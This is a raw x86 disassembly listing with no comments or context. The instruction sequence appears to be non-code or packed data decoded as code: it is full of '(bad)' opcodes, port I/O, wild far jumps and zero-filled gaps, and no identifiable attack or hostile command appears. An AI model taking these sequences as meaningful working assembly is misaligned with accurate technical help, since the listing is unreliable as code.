  40d769:	xchg   BYTE PTR [ebp+ebx*1-0x734c8189],ah
  40d770:	push   ecx
  40d771:	lea    ebx,[eax+ebp*2-0x53]
  40d775:	sbb    DWORD PTR [ebx+0x0],ecx
  40d778:	jmp    0x40d7d9
  40d77a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d77b:	mul    bl
  40d77d:	sbb    eax,0xf4b434b5
  40d782:	dec    edx
  40d783:	add    ah,ah
  40d785:	nop
  40d786:	es dec ebx
  40d789:	mov    ds:0x3dbbeb8e,eax
  40d78e:	mov    ch,0x82
  40d790:	stc    
  40d791:	call   0x3cf4d652
  40d796:	ds pop edx
  40d798:	punpckhbw mm7,QWORD PTR [ebx+eax*1-0x7b808be7]
  40d7a0:	test   al,0xdd
  40d7a2:	mov    ah,0xfe
  40d7a4:	xchg   ebx,eax
  40d7a5:	dec    esp
  40d7a6:	test   DWORD PTR [eax+edi*2+0xdfeb4ff],eax
  40d7ad:	shl    DWORD PTR [ebp-0x5de8840a],0x2
	...
  40d7c8:	mov    WORD PTR [ebx],?
  40d7ca:	cmp    al,0xa
  40d7cc:	push   ebx
  40d7cd:	mov    cl,0xa5
  40d7cf:	mul    BYTE PTR [ebx-0x61]
  40d7d2:	mov    eax,ds:0xa13b8c02
  40d7d7:	sbb    DWORD PTR [ebx-0x6b],edx
  40d7da:	jl     0x40d78b
  40d7dc:	inc    edx
  40d7dd:	es push edi
  40d7df:	mov    esp,0xbc5738f8
  40d7e4:	cmp    ah,BYTE PTR [esi]
  40d7e6:	popf   
  40d7e7:	stos   DWORD PTR es:[edi],eax
  40d7e8:	cmp    ah,BYTE PTR [esi]
  40d7ea:	dec    edi
  40d7eb:	mov    esp,0x3b579ca0
  40d7f0:	and    BYTE PTR [esi],ah
  40d7f2:	aas    
  40d7f3:	sbb    al,0x38
  40d7f6:	aas    
  40d7f7:	mov    esp,0xde949512
  40d7fc:	or     ah,al
  40d7fe:	add    esi,DWORD PTR [edx+eax*1+0x65980826]
  40d805:	and    eax,0x3938bc07
  40d80a:	idiv   DWORD PTR [ebx+0x29503cea]
  40d810:	jecxz  0x40d837
  40d812:	push   DWORD PTR [ebp-0xd]
  40d815:	sbb    eax,0x9fd2bbe7
  40d81a:	imul   DWORD PTR [ebx-0x4428d951]
  40d820:	ret    0xc7df
  40d823:	mov    bl,0xba
  40d825:	and    eax,0x252633c8
  40d82a:	iret   
  40d82b:	mov    ebx,0x0
	...
  40d840:	push   eax
  40d841:	sub    al,0xd9
  40d843:	mov    edi,0xbbbf25a1
  40d848:	and    BYTE PTR [eax],ch
  40d84a:	enter  0x3997,0x94
  40d84e:	(bad)  
  40d850:	dec    ebp
  40d851:	pushf  
  40d852:	fist   WORD PTR [eax+0x17]
  40d855:	cmp    BYTE PTR [ebx-0x40],ah
  40d858:	ja     0x40d814
  40d85a:	fild   QWORD PTR ds:0xbf525bc
  40d860:	je     0x40d87d
  40d862:	btc    DWORD PTR [edx+0x1b],esp
  40d866:	or     DWORD PTR [esp+edx*1],ebp
  40d869:	lods   eax,DWORD PTR ds:[esi]
  40d86a:	add    DWORD PTR ds:0xdcf594c9,eax
  40d870:	xchg   edi,eax
  40d871:	cmp    al,0xaa
  40d873:	pop    edi
  40d874:	pop    es
  40d875:	es neg ah
  40d878:	add    esp,DWORD PTR [esi]
  40d87a:	jl     0x40d85d
  40d87c:	out    0xe0,eax
  40d87e:	ins    DWORD PTR es:[edi],dx
  40d87f:	inc    esi
  40d880:	out    0x5b,eax
  40d882:	retf   
  40d883:	in     eax,0x8f
  40d885:	mov    edi,0x51134581
  40d88a:	cmc    
  40d88b:	xchg   edi,eax
  40d88c:	mov    esi,0x9308ba
  40d891:	es jl  0x40d885
  40d894:	aaa    
  40d895:	mov    edi,0x1c37166d
  40d89a:	dec    esp
  40d89b:	or     eax,0xb1546003
  40d8a0:	push   eax
  40d8a1:	xchg   esp,eax
  40d8a2:	cmp    DWORD PTR [eax+eax*1+0x0],0x0
	...
  40d8b5:	add    BYTE PTR [eax],al
  40d8b7:	add    BYTE PTR [edi+0xfe947dc],ch
  40d8bd:	data16 or BYTE PTR [ebp+0x4c],dh
  40d8c1:	mov    esp,0x94514db4
  40d8c6:	pop    ebp
  40d8c7:	sar    DWORD PTR [edx-0x42],1
  40d8ca:	or     cl,ch
  40d8cc:	mov    dl,BYTE PTR [ebp+edi*2-0x12]
  40d8d0:	pop    ebp
  40d8d1:	cmp    al,0xce
  40d8d3:	cmp    ah,bh
  40d8d5:	and    eax,0x94885159
  40d8da:	in     eax,0x77
  40d8dc:	addr16 dec esi
  40d8de:	ins    DWORD PTR es:[edi],dx
  40d8df:	sub    BYTE PTR [eax-0x67e30a3c],cl
  40d8e5:	sub    al,0xda
  40d8e7:	jnp    0x40d92f
  40d8e9:	and    esp,ecx
  40d8eb:	mov    ch,0xa8
  40d8ed:	and    esi,esi
  40d8ef:	or     BYTE PTR [eax+0x530088da],0x98
  40d8f6:	jnp    0x40d8f2
  40d8f8:	stos   DWORD PTR es:[edi],eax
  40d8f9:	fdivr  QWORD PTR [edx]
  40d8fb:	rcr    BYTE PTR [esi+ebx*8-0x161d000a],0xa3
  40d903:	cmp    BYTE PTR [edx],bh
  40d905:	gs mov cl,0xff
  40d908:	pop    eax
  40d909:	in     al,dx
  40d90a:	div    BYTE PTR [ebp+0x2d]
  40d90d:	lock cmp eax,0x56dec267
  40d913:	pop    esi
  40d914:	pop    esp
  40d915:	pop    ecx
  40d916:	or     al,BYTE PTR [eax]
  40d918:	clc    
  40d919:	adc    ah,dl
  40d91b:	add    DWORD PTR [eax],0x0
	...
  40d92e:	add    BYTE PTR [eax],al
  40d930:	imul   ebx,edi,0xdfe8c75a
  40d936:	cmc    
  40d937:	push   ebp
  40d939:	xchg   edi,eax
  40d93a:	int    0x45
  40d93c:	mov    eax,ds:0xe5000897
  40d941:	adc    cl,BYTE PTR [ebp+0xc]
  40d944:	popw   ds
  40d946:	div    BYTE PTR [esp+ebx*8+0x32]
  40d94a:	mov    dh,0x2b
  40d94c:	xchg   edx,eax
  40d94e:	mov    edi,0xb197f1c2
  40d953:	add    ebp,esp
  40d955:	xchg   edi,eax
  40d956:	or     bl,ch
  40d958:	push   esp
  40d959:	sbb    DWORD PTR [ebp+0x10],esi
  40d95c:	mov    ch,0x73
  40d95e:	or     ecx,DWORD PTR [ebx+0x187f8868]
  40d964:	ret    0x473
  40d967:	jmp    FWORD PTR [eax-0x70]
  40d96a:	loopne 0x40d9e2
  40d96c:	dec    ecx
  40d96d:	(bad)  
  40d96f:	sbb    esi,0xffffff8f
  40d972:	jnp    0x40d979
  40d974:	lods   al,BYTE PTR ds:[esi]
  40d975:	(bad)  
  40d976:	lock jmp 0x40d934
  40d979:	enter  0x7f2b,0x22
  40d97d:	(bad)  
  40d97f:	or     DWORD PTR [eax+esi*2-0x52daa84c],ecx
  40d986:	or     al,0x0
  40d988:	mov    WORD PTR [eax],fs
  40d98a:	or     al,0xeb
  40d98c:	lahf   
  40d98d:	scas   al,BYTE PTR es:[edi]
  40d98e:	mov    bl,0x7
  40d990:	loope  0x40d9d2
  40d992:	test   DWORD PTR [eax+eax*1+0x0],eax
	...
  40d9a6:	add    BYTE PTR [eax],al
  40d9a8:	push   esp
  40d9a9:	mov    dh,0x45
  40d9ab:	cld    
  40d9ac:	fwait
  40d9ad:	adc    edi,ecx
  40d9af:	pop    es
  40d9b0:	dec    ebp
  40d9b1:	int    0x4
  40d9b3:	mov    ecx,edx
  40d9b5:	lds    eax,FWORD PTR [ecx+0x1bd63054]
  40d9bb:	mov    edx,ecx
  40d9bd:	aad    0x83
  40d9bf:	push   esp
  40d9c0:	and    BYTE PTR [edx],dh
  40d9c2:	push   esi
  40d9c3:	rcl    DWORD PTR [ebx+0x506ac6c],0xf8
  40d9ca:	mov    cl,0x88
  40d9cc:	popa   
  40d9cd:	jns    0x40da1a
  40d9cf:	add    DWORD PTR [edi],0x24
  40d9d2:	cmp    BYTE PTR [edx-0x7cf20ff9],bl
  40d9d8:	mov    ah,0x2d
  40d9da:	daa    
  40d9db:	push   es
  40d9dc:	mov    bh,0x6d
  40d9de:	jecxz  0x40d9b1
  40d9e0:	idiv   DWORD PTR [edx]
  40d9e2:	test   DWORD PTR [esp+edx*8-0x4b],eax
  40d9e6:	inc    ebp
  40d9e7:	cld    
  40d9e8:	aaa    
  40d9e9:	je     0x40d9b9
  40d9eb:	or     ecx,DWORD PTR [eax+eiz*2-0x6f0147d]
  40d9f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d9f3:	mov    al,ds:0x4abb20
  40d9f8:	jne    0x40da72
  40d9fa:	add    BYTE PTR [esi-0x6e],dh
  40d9fd:	xchg   ah,cl
  40d9ff:	enter  0x3cce,0xa
  40da03:	jmp    DWORD PTR [ecx-0x3f]
  40da06:	jg     0x40da48
  40da08:	mov    WORD PTR [ebp-0x50],ss
  40da0b:	add    BYTE PTR [bx+si],al
	...
  40da1e:	add    BYTE PTR [eax],al
  40da20:	mov    edx,DWORD PTR [ebp+0x1cc88aae]
  40da26:	gs ds js 0x40d9ef
  40da2a:	xchg   esp,edi
  40da2c:	shl    DWORD PTR [ecx],cl
  40da2e:	xchg   DWORD PTR [eax+0x2e8e88e0],edi
  40da34:	nop
  40da35:	and    ebp,edi
  40da37:	mov    ebx,0xabe7a85a
  40da3c:	ret    
  40da3d:	mov    ch,0x66
  40da3f:	mov    eax,0x7fff5496
  40da44:	jmp    0x3b44b9dd
  40da49:	test   al,0xeb
  40da4b:	mov    eax,0x2e471cb8
  40da50:	sub    BYTE PTR ds:0x22232254,ch
  40da56:	jnp    0x40da96
  40da58:	mov    BYTE PTR [ebp-0x5c],bl
  40da5b:	adc    eax,DWORD PTR [ebx-0x73fc73eb]
  40da61:	xchg   esp,eax
  40da62:	cs cs cwde 
  40da65:	and    DWORD PTR [ebp-0x7d341bf5],ebx
  40da6b:	mov    eax,0xafad0bf2
  40da70:	imul   BYTE PTR [eax+0x6dd8460e]
  40da76:	adc    DWORD PTR [eax+edx*2-0x2208d8],ecx
  40da7d:	adc    ah,BYTE PTR [ecx+0x54469703]
  40da83:	add    al,BYTE PTR [eax]
	...
  40da95:	add    BYTE PTR [eax],al
  40da97:	add    BYTE PTR [edi+0x5c0459ac],dh
  40da9d:	and    DWORD PTR [ebp+0xc],edx
  40daa0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40daa1:	cmp    BYTE PTR [edi],0xb7
  40daa4:	stos   BYTE PTR es:[edi],al
  40daa5:	and    DWORD PTR ds:0xf7a7a310,esi
  40daab:	stos   DWORD PTR es:[edi],eax
  40daac:	jne    0x40da63
  40daae:	or     BYTE PTR [esi-0x2aa3f125],dh
  40dab4:	push   cs
  40dab5:	pop    ebx
  40dab6:	or     BYTE PTR [esi+ecx*4],bl
  40dab9:	sub    eax,0x28cd7041
  40dabe:	and    ah,0x3
  40dac1:	cmovs  ebp,ecx
  40dac4:	push   cs
  40dac5:	sub    al,0xd
  40dac7:	sbb    BYTE PTR [ebx],bl
  40dac9:	test   al,0x1c
  40dacb:	sbb    BYTE PTR [ebx],ah
  40dacd:	test   al,0xf0
  40dacf:	jbe    0x40da6e
  40dad1:	mov    eax,fs
  40dad3:	lahf   
  40dad4:	outs   dx,BYTE PTR ds:[esi]
  40dad5:	and    esi,esi
  40dad7:	rcl    BYTE PTR [esi-0x191483ac],0x77
  40dade:	push   edi
  40dadf:	push   esi
  40dae0:	jge    0x40dafe
  40dae2:	not    ah
  40dae4:	jecxz  0x40db1e
  40dae6:	sbb    al,0xc8
  40dae8:	fisub  DWORD PTR [ecx]
  40daea:	div    BYTE PTR [ebx+eiz*8-0x2536ffc8]
  40daf1:	and    DWORD PTR [ecx+ebp*8],esi
  40daf4:	(bad)  
  40daf5:	aam    0xe
  40daf7:	lahf   
  40daf8:	lea    ebp,ds:0x6a01
	...
  40db0e:	add    BYTE PTR [eax],al
  40db10:	mov    ch,0x28
  40db12:	or     DWORD PTR [ecx+esi*2-0x62f1eed2],ebx
  40db19:	and    cl,ah
  40db1b:	pop    edx
  40db1c:	cmp    esp,DWORD PTR [ecx]
  40db1e:	mul    BYTE PTR [esi]
  40db20:	dec    ebp
  40db21:	and    BYTE PTR [ecx],cl
  40db23:	jmp    0xa4c26fb7
  40db28:	fwait
  40db29:	pop    ecx
  40db2a:	or     ecx,ebp
  40db2c:	(bad)  
  40db2d:	xchg   esp,eax
  40db2e:	or     dh,bl
  40db30:	jl     0x40db4e
  40db32:	loope  0x40db09
  40db34:	xchg   edx,eax
  40db35:	and    esi,esi
  40db37:	bound  ecx,QWORD PTR [eax+eiz*1-0x40]
  40db3b:	add    bh,dh
  40db3d:	test   BYTE PTR [eax],cl
  40db3f:	push   ebp
  40db40:	push   ds
  40db41:	stc    
  40db42:	pop    esi
  40db43:	mov    esp,DWORD PTR [eax-0x74]
  40db46:	mov    eax,eax
  40db48:	ins    DWORD PTR es:[edi],dx
  40db49:	(bad)  
  40db4a:	loopne 0x40db48
  40db4c:	xchg   edx,eax
  40db4d:	out    0xf6,eax
  40db4f:	mov    ebp,DWORD PTR ds:0xea0c7ce7
  40db55:	push   ds
  40db56:	div    DWORD PTR [ebp+0x65]
  40db59:	pop    ss
  40db5a:	dec    edi
  40db5b:	add    al,0xf6
  40db5d:	pop    esp
  40db5e:	add    al,0x0
  40db60:	popa   
  40db61:	xchg   edi,eax
  40db62:	cmc    
  40db63:	jne    0x40dbce
  40db65:	or     eax,0xe7a5084f
  40db6a:	jl     0x40db74
  40db6c:	fisttp QWORD PTR [eax+0xadaff60]
  40db72:	dec    ebp
  40db73:	adc    al,0x0
	...
  40db85:	add    BYTE PTR [eax],al
  40db87:	add    BYTE PTR [ebx+ebx*1-0x6bcafe42],ch
  40db8e:	or     BYTE PTR [edi+0x5c],bl
  40db91:	push   ebp
  40db92:	push   es
  40db93:	add    BYTE PTR [eax],al
  40db95:	or     esp,edx
  40db97:	and    DWORD PTR [ecx-0x11],0xffffff82
  40db9b:	push   ebp
  40db9c:	loope  0x40db7c
  40db9e:	pop    es
  40db9f:	add    ch,dh
  40dba1:	xchg   ebx,eax
  40dba2:	or     BYTE PTR [ebx],ch
  40dba4:	mov    bh,0xee
  40dba6:	dec    esp
  40dba7:	or     al,0xe4
  40dba9:	xchg   ebx,eax
  40dbaa:	or     BYTE PTR [eax],al
  40dbac:	retf   0xc80f
  40dbaf:	or     DWORD PTR [eax],0xffffff98
  40dbb2:	or     BYTE PTR [ebp-0x4a],dh
  40dbb5:	out    0x7c,al
  40dbb7:	adc    al,0xf
  40dbb9:	xchg   ebx,eax
  40dbba:	bound  eax,QWORD PTR [eax]
  40dbbc:	sete   al
  40dbbf:	nop
  40dbc0:	stos   BYTE PTR es:[edi],al
  40dbc1:	jmp    0x92ddc5bc
  40dbc6:	or     BYTE PTR [eax],al
  40dbc8:	mov    WORD PTR [edx-0x3772f3c3],gs
  40dbce:	out    0xfe,eax
  40dbd0:	sbb    DWORD PTR ds:0x458474bd,edi
  40dbd6:	cmp    DWORD PTR [edx-0x6d],esp
  40dbd9:	out    0x81,al
  40dbdb:	inc    esp
  40dbdc:	mov    dh,ch
  40dbde:	and    eax,0x202df614
  40dbe3:	add    al,0x9
  40dbe5:	js     0x40db97
  40dbe7:	dec    edi
  40dbe8:	mov    ?,WORD PTR fs:[ebx+0xfe]
	...
  40dbff:	add    BYTE PTR [ebx+0x14],ch
  40dc02:	or     eax,0x892d8c02
  40dc07:	jl     0x40db91
  40dc09:	sub    esp,DWORD PTR [edi]
  40dc0b:	and    edx,DWORD PTR [ebx+0x20]
  40dc0e:	sbb    bh,bh
  40dc10:	shl    DWORD PTR ds:0xb6ae1da2,0xbb
  40dc17:	mov    cl,dl
  40dc19:	sar    DWORD PTR [ebx+0xa539874],0x6a
  40dc20:	nop
  40dc21:	shl    BYTE PTR ds:0xfec5bcfc,0xfe
  40dc28:	sbb    ebx,DWORD PTR [esi-0x5f]
  40dc2b:	(bad)  
  40dc2c:	lea    ebp,ds:0x4189830a
  40dc32:	or     DWORD PTR [ebp-0x54],esi
  40dc35:	jbe    0x40dc5c
  40dc37:	adc    BYTE PTR [esi+0x2a],ah
  40dc3a:	mov    ebp,0x3f958474
  40dc3f:	(bad)  
  40dc40:	jmp    0x40dbcf
  40dc42:	mov    ebx,0x9037874
  40dc47:	push   0xffffff8c
  40dc49:	add    ecx,DWORD PTR [edx]
  40dc4b:	call   0xfefe02c4
  40dc50:	mov    ch,0x5b
  40dc52:	or     DWORD PTR [eax],eax
  40dc54:	mov    WORD PTR [edx+eiz*2+0x5c988836],ss
  40dc5b:	loope  0x40dc0f
  40dc5d:	test   al,0xef
  40dc5f:	mov    ah,0x20
  40dc61:	mov    edi,es
  40dc63:	pusha  
	...
  40dc78:	sub    al,0x1f
  40dc7a:	iret   
  40dc7b:	mov    dl,BYTE PTR [eax+0x20]
  40dc7e:	mov    bh,0x2e
  40dc80:	js     0x40dc2c
  40dc82:	fild   QWORD PTR [ecx]
  40dc84:	nop
  40dc85:	cvtps2pi mm7,QWORD PTR [eax-0x4a60d32d]
  40dc8c:	jp     0x40dcac
  40dc8e:	cdq    
  40dc8f:	mov    ecx,DWORD PTR [esp+edx*4-0x6f177f21]
  40dc96:	in     al,dx
  40dc97:	cs jnp 0x40dcb7
  40dc9a:	cmc    
  40dc9b:	adc    esp,esi
  40dc9d:	xchg   esi,eax
  40dc9e:	jbe    0x40dcce
  40dca0:	test   BYTE PTR [esp+edi*2],ch
  40dca3:	and    cl,BYTE PTR [ebx+0x1e]
  40dca6:	cmp    BYTE PTR [edx],al
  40dca8:	mov    WORD PTR [edi+ebx*8-0x206c5956],ss
  40dcaf:	add    ecx,DWORD PTR [edi]
  40dcb1:	mov    al,ds:0x74a0fdeb
  40dcb6:	inc    esi
  40dcb7:	cs jl  0x40dc64
  40dcba:	div    DWORD PTR [eax+eiz*4-0x532ba874]
  40dcc1:	sbb    eax,0x8880b43f
  40dcc6:	leave  
  40dcc7:	add    BYTE PTR [esi-0x6c],dh
  40dcca:	cdq    
  40dccb:	add    esp,esp
  40dccd:	lock adc eax,0xa52bf2b4
  40dcd3:	add    cl,BYTE PTR [esp+edx*4-0x6a6fc99e]
  40dcda:	je     0x40dcbf
	...
  40dcf0:	fisub  DWORD PTR [edi+0x1d8429cf]
  40dcf6:	or     DWORD PTR [edi+edx*4+0x2c],edi
  40dcfa:	mov    al,0x88
  40dcfc:	clc    
  40dcfd:	push   ds
  40dcfe:	neg    BYTE PTR [esp+edx*4-0x56]
  40dd02:	or     DWORD PTR [ebx-0x78],edx
  40dd05:	stos   BYTE PTR es:[edi],al
  40dd06:	or     cl,al
  40dd08:	push   ss
  40dd09:	and    dh,dh
  40dd0b:	into   
  40dd0c:	add    DWORD PTR [edi+0x7],edi
  40dd0f:	jmp    0xedb4eea3
  40dd14:	xchg   edi,eax
  40dd15:	test   al,0x14
  40dd17:	scas   al,BYTE PTR es:[edi]
  40dd18:	aad    0x20
  40dd1a:	or     ecx,ebp
  40dd1c:	(bad)  
  40dd1d:	xchg   esp,eax
  40dd1e:	cmc    
  40dd1f:	sbb    al,0x94
  40dd21:	stos   BYTE PTR es:[edi],al
  40dd22:	or     BYTE PTR [ebx],dl
  40dd24:	test   BYTE PTR [edi],cl
  40dd26:	dec    esp
  40dd27:	xchg   ebp,eax
  40dd28:	shr    BYTE PTR [ebp*2-0x1fe1e071],0x84
  40dd30:	nop
  40dd31:	xchg   esp,eax
  40dd32:	or     BYTE PTR [edx-0x63],ch
  40dd35:	nop
  40dd36:	(bad)  
  40dd37:	sti    
  40dd38:	fwait
  40dd39:	push   ebp
  40dd3a:	dec    esp
  40dd3b:	ins    DWORD PTR es:[edi],dx
  40dd3c:	mov    DWORD PTR [eax+ecx*1+0x1ca7fee9],edx
  40dd43:	ror    DWORD PTR [edi-0x2a9bf356],cl
  40dd49:	and    BYTE PTR [ecx+0x41],bl
  40dd4c:	retf   0xf61e
  40dd4f:	inc    esi
  40dd50:	stc    
  40dd51:	cmp    DWORD PTR [ecx],ecx
  40dd53:	jmp    0x40dd58
	...
  40dd68:	(bad)  
  40dd69:	adc    DWORD PTR [ebp+eiz*8+0x9],esi
  40dd6d:	test   al,0x2
  40dd6f:	jno    0x40dcf9
  40dd71:	xchg   esp,eax
  40dd72:	or     cl,ch
  40dd74:	sbb    BYTE PTR [edx+0x9],cl
  40dd77:	jmp    0xe5b4ef0b
  40dd7c:	jmp    0x894:0x885102a7
  40dd83:	add    ch,ah
  40dd85:	push   DWORD PTR [edx-0x766f1b00]
  40dd8b:	jge    0x40dd3e
  40dd8d:	sbb    al,0x78
  40dd8f:	push   ebp
  40dd90:	scas   al,BYTE PTR es:[edi]
  40dd91:	inc    esi
  40dd92:	jp     0x40dde5
  40dd94:	and    al,0x64
  40dd96:	add    al,0x0
  40dd98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd99:	ror    BYTE PTR [esi],1
  40dd9b:	jae    0x40de0a
  40dd9d:	loope  0x40de1b
  40dd9f:	or     al,0x42
  40dda1:	int3   
  40dda2:	cld    
  40dda3:	add    DWORD PTR [eax-0x24],0x1
  40dda7:	rol    DWORD PTR [eax-0x24],1
  40ddaa:	div    BYTE PTR [ebp+0x49]
  40ddad:	add    BYTE PTR [ecx],cl
  40ddaf:	data16 xor ah,bh
  40ddb2:	add    BYTE PTR [ebp+0x2d],0xe7
  40ddb6:	jl     0x40ddc8
  40ddb8:	adc    bl,BYTE PTR [ebp-0x4]
  40ddbb:	dec    DWORD PTR [eax+0x6d75f6e8]
  40ddc1:	add    BYTE PTR [edx+0x60],dl
  40ddc4:	adc    ah,bh
  40ddc6:	div    BYTE PTR [ebp+0x39]
  40ddc9:	jp     0x40ddd5
  40ddcb:	inc    DWORD PTR [eax]
	...
  40dddd:	add    BYTE PTR [eax],al
  40dddf:	add    BYTE PTR [eax-0x1c],cl
  40dde2:	div    BYTE PTR [ebp-0x43]
  40dde5:	(bad)  
  40dde6:	fdivr  st,st(5)
  40dde8:	mov    dl,0xe6
  40ddea:	div    BYTE PTR [ebp-0x53]
  40dded:	push   DWORD PTR [ebx-0x42193d9b]
  40ddf3:	add    DWORD PTR ds:0x45eb0898,esi
  40ddf9:	adc    esi,DWORD PTR [ebp+0xc]
  40ddfc:	and    BYTE PTR [edx+0x5b],ah
  40ddff:	or     esp,DWORD PTR [edi+0x3081575c]
  40de05:	sbb    al,0xf6
  40de07:	jmp    DWORD PTR ds:0x9248798e
  40de0d:	pop    esp
  40de0e:	add    al,0x8f
  40de10:	mov    eax,gs
  40de12:	mov    ebp,0x8817182
  40de17:	shr    DWORD PTR [ecx+0x19],1
  40de1a:	mov    eax,0x5f85d874
  40de1f:	fs retf 
  40de21:	and    dh,BYTE PTR [edx+0x44]
  40de24:	les    ebp,FWORD PTR [edx]
  40de26:	adc    BYTE PTR ds:[ebx+0x39feb0b8],bh
  40de2d:	xor    eax,0x559474b8
  40de32:	or     ah,BYTE PTR [eax-0x5d]
  40de35:	dec    edx
  40de36:	mov    eax,0x9c78074
  40de3b:	call   FWORD PTR [ecx]
  40de3d:	loope  0x40ddf6
  40de3f:	je     0x40ddc5
  40de41:	push   ebp
  40de42:	xor    edi,ebp
	...
  40de58:	sub    edx,0xffffffb7
  40de5b:	je     0x40ded1
  40de5d:	add    eax,0xfa73652c
  40de62:	add    BYTE PTR fs:[ebp+ebp*1-0x3a7614f6],cl
  40de6a:	or     al,0x0
  40de6c:	mov    WORD PTR ds:0x2d7cc1b3,gs
  40de72:	pop    edi
  40de73:	mov    edi,DWORD PTR [eax]
  40de75:	jnp    0x40de02
  40de77:	jl     0x40de0d
  40de79:	sub    eax,0x64da053f
  40de7e:	into   
  40de7f:	add    ecx,DWORD PTR [esi+eiz*4+0x3737083d]
  40de86:	mov    ecx,0x2d853435
  40de8b:	call   FWORD PTR [ebx]
  40de8d:	scas   al,BYTE PTR es:[edi]
  40de8e:	ret    0xf03
  40de91:	sbb    ecx,DWORD PTR [edx]
  40de93:	jne    0x40de92
  40de95:	popa   
  40de96:	cmp    eax,0x2d94f408
  40de9b:	(bad)  
  40de9c:	sti    
  40de9d:	xchg   ebx,eax
  40de9e:	int    0xba
  40dea0:	int    0x8f
  40dea2:	fist   WORD PTR [esi+0x17]
  40dea5:	sub    BYTE PTR [ebx+0x47],ch
  40dea8:	xchg   esp,eax
  40dea9:	bsr    edi,edi
  40deac:	push   es
  40dead:	nop
  40deae:	dec    edi
  40deaf:	test   DWORD PTR [eax-0x7c],edx
  40deb2:	fbstp  TBYTE PTR [edi]
  40deb4:	xchg   ebx,eax
  40deb5:	setne  BYTE PTR [ebx]
  40deb8:	ret    
  40deb9:	arpl   WORD PTR [esi+0x6],dx
	...
  40ded0:	setns  bl
  40ded3:	add    edi,DWORD PTR [eax]
  40ded5:	mov    WORD PTR [edx+0x56],?
  40ded8:	sbb    BYTE PTR [ebx],0x50
  40dedb:	or     BYTE PTR [ebx],dl
  40dedd:	xchg   esi,eax
  40dede:	bound  ebp,QWORD PTR [esi]
  40dee0:	je     0x40de76
  40dee2:	xor    edi,ebx
  40dee4:	push   es
  40dee5:	shl    edi,0x53
  40dee8:	sbb    edx,DWORD PTR [edi+0x4b940562]
  40deee:	mov    ds:0x7abf8c17,al
  40def3:	lahf   
  40def4:	push   cs
  40def5:	push   ecx
  40def6:	mov    ah,0x58
  40def8:	ret    0x250d
  40defb:	adc    al,0x4b
  40defd:	xchg   ebp,eax
  40defe:	fild   WORD PTR [ebx]
  40df00:	mov    WORD PTR [edx+edi*2-0x1fae7fba],ss
  40df07:	add    ecx,DWORD PTR [esp+edx*4-0x733f7b21]
  40df0e:	fbstp  TBYTE PTR [esi]
  40df10:	test   BYTE PTR [ebp+0x1f],ch
  40df13:	push   ecx
  40df14:	ror    DWORD PTR [ebx+0x22],cl
  40df17:	jmp    FWORD PTR [ebx]
  40df19:	sbb    edx,ebp
  40df1b:	sti    
  40df1c:	sub    eax,DWORD PTR [eax]
  40df1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df1f:	mov    al,0x1a
  40df21:	mov    ds,WORD PTR [edi]
  40df23:	test   BYTE PTR ss:[ebp+0x1f],ch
  40df27:	push   ecx
  40df28:	imul   ecx,DWORD PTR [ebx+0x9],0x2b
  40df2c:	add    ebx,DWORD PTR [edx]
  40df2e:	and    DWORD PTR [edi+eiz*1+0xf17c1b],0x0
	...
  40df45:	add    BYTE PTR [eax],al
  40df47:	add    BYTE PTR [edi],dl
  40df49:	out    dx,eax
  40df4a:	push   esi
  40df4b:	push   ds
  40df4c:	sbb    al,0x53
  40df4e:	dec    esp
  40df4f:	sbb    eax,0xe908948e
  40df54:	pop    edx
  40df55:	shl    ah,1
  40df57:	cdq    
  40df58:	push   edx
  40df59:	sar    ah,1
  40df5b:	cdq    
  40df5c:	cld    
  40df5d:	mov    al,ds:0x1be40100
  40df62:	imul   dh
  40df64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df65:	shl    ah,1
  40df67:	pop    esi
  40df68:	mov    dh,0x16
  40df6a:	je     0x40df41
  40df6c:	nop
  40df6d:	mov    al,ds:0xa5bde20c
  40df72:	add    BYTE PTR [edx],al
  40df74:	shl    BYTE PTR [edi-0x72314fab],1
  40df7a:	or     BYTE PTR [edx],dl
  40df7c:	aad    0x28
  40df7e:	sub    BYTE PTR [eax+eiz*1],0x14
  40df82:	je     0x40df45
  40df84:	nop
  40df85:	xchg   esp,eax
  40df86:	test   al,0xe9
  40df88:	mov    ecx,0xdaa9218c
  40df8d:	mov    ecx,0x948cabbf
  40df92:	and    DWORD PTR [eax+edi*8],0xbfebe953
  40df99:	sub    al,0x61
  40df9b:	add    eax,0x2c8019fb
  40dfa0:	cld    
  40dfa1:	or     eax,0x30c5a6f1
  40dfa6:	or     ecx,ebp
  40dfa8:	(bad)  
  40dfa9:	xchg   esp,eax
  40dfaa:	loope  0x40dfc6
	...
  40dfc0:	or     eax,0xcb9f8d0
  40dfc5:	sar    ah,1
  40dfc7:	mov    ecx,0x9fea
  40dfcc:	mov    ebp,0xcafff269
  40dfd1:	popf   
  40dfd2:	inc    esp
  40dfd3:	lock (bad) 
  40dfd5:	shl    eax,cl
  40dfd7:	ja     0x40dfca
  40dfd9:	sbb    eax,0xe9f574d8
  40dfde:	jl     0x40dfdc
  40dfe0:	jge    0x40df6b
  40dfe2:	ins    BYTE PTR es:[edi],dx
  40dfe3:	(bad)  
  40dfe4:	jp     0x40e023
  40dfe6:	mov    dh,0x5e
  40dfe8:	sub    bl,al
  40dfea:	(bad)  
  40dfeb:	or     al,0xe5
  40dfed:	aaa    
  40dfee:	inc    ebp
  40dfef:	call   0xac2dabbe
  40dff4:	ss arpl ax,sp
  40dff7:	add    BYTE PTR [ebx-0x71],al
  40dffa:	mov    DWORD PTR [ebp-0x2f],edi
  40dffd:	xchg   esp,eax
  40dffe:	jnp    0x40dfc1
  40e000:	ss fs loopne 0x40e004
  40e004:	inc    eax
  40e005:	xchg   edx,eax
  40e006:	mov    DWORD PTR [ebp-0x3f],edi
  40e009:	xchg   esp,eax
  40e00a:	jnp    0x40e01c
  40e00c:	retf   0xf45b
  40e00f:	call   0x365359
  40e014:	mov    ss,WORD PTR [eax+0x54]
  40e017:	pop    edi
  40e018:	sub    al,0x56
  40e01a:	add    al,BYTE PTR [eax]
  40e01c:	out    0x64,al
  40e01e:	in     al,dx
  40e01f:	add    BYTE PTR [eax+0x8bdf8d],al
	...
  40e035:	add    BYTE PTR [eax],al
  40e037:	add    BYTE PTR [ebp-0x6c],dh
  40e03a:	or     BYTE PTR [ebx+0x75f580b0],cl
